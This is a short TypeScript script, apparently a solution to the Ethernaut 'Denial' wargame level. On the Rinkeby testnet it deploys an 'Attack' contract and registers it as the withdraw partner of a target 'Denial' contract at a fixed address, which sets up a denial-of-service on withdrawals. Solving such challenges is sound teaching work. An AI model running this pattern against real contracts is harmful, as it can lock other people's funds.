import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory, Denial__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0xf2f6747fc62fbd4a9B7488cb3107a56a15539202"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  (new Attack__factory(alice)).deploy().then(async attack => {
    const denial = Denial__factory.connect(addr, provider).connect(alice)
    await denial.setWithdrawPartner(attack.address)
    console.log("partner set.")
    // await denial.withdraw()
    console.log("done")
  })

}

main().catch(e => {
  console.log("Error: " + e)
})
